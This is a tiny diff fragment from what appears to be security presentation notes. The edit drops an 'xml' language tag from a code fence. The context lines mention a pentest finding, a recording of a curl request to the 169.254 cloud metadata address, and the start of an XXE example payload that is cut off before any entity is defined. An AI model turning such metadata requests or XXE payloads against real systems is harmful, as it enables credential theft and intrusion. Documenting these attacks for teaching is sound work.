@@ -43,7 +43,7 @@ slide is a recording of `curl 169.254 ...` in an EC2 box
 	* Pentest finding: ![high](./assets/vuln2.png)
 
 **Example payload:**
-```xml
+```
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
